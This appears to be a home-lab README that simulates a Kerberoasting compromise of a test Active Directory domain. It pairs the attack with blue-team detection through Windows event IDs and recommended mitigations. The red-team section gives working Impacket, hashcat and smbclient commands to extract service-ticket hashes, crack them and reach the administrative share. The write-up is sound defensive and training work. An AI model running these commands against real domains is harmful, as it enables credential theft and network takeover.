# Kerberoasting-Active-Directory-Attack-Detection
Simulate a full Active Directory domain compromise via Kerberoasting and perform forensic blue team detection using Windows Event Logs.

**Objective:** Simulate a full Active Directory domain compromise via Kerberoasting and perform forensic blue team detection using Windows Event Logs.

**Environment:**
- Windows Server 2022 (Domain Controller — corp.local, IP: 10.0.2.5)
- Kali Linux (Attacker, IP: 10.0.2.15)
- Tools: Impacket, Hashcat, SMBClient

**Attack chain performed:**

**Phase 1 — Environment Setup**
- Deployed AD DS on Windows Server 2022
- Configured domain: `corp.local`
- Created `SQL_SVC` service account with SPN assigned

**Phase 2 — Red Team (Attack Execution)**

```bash
# Step 1: Kerberoasting — extract TGS hash
sudo ntpdate 10.0.2.5   # Fix clock skew
impacket-GetUserSPNs corp.local/bob:Admin123 -request -dc-ip 10.0.2.5

# Step 2: Offline credential cracking
hashcat -m 13100 hash1.txt custom.txt --force
# Result: Password cracked → Password123

# Step 3: SMB access with compromised credentials
smbclient //10.0.2.5/C$ -U corp.local/sql_svc%Password123
# Result: Full C$ administrative share access confirmed
```

**Phase 3 — Blue Team (Forensic Detection)**

| Event ID | Title | Detection Value |
|----------|-------|----------------|
| 4769 | Kerberos Service Ticket Request | High volume of RC4 (0x17) encryption requests → Kerberoasting indicator |
| 4728 | Member Added to Security Group | Service account granted Domain Admin privileges |
| 4672 | Special Privileges Assigned | "God-mode" admin rights confirmed on new logon |
| 4624 | Successful Logon | Remote entry tracked from attacker's Kali IP |

**Threat Hunting Hypothesis:**
> Accounts generating abnormal volumes of Event ID 4769 with RC4 encryption type (0x17) may indicate Kerberoasting activity.

**Phase 4 — Mitigations Recommended:**
- Implement Group Managed Service Accounts (gMSA) — eliminates static passwords
- Enforce AES-128/256 Kerberos encryption — disable RC4
- Apply Principle of Least Privilege — service accounts must not hold admin rights
- SIEM alerts on Event ID 4728 (sensitive group changes) and anomalous 4769 volumes

**Tools:** Windows Server 2022, Kali Linux, Impacket, Hashcat, SMBClient

---
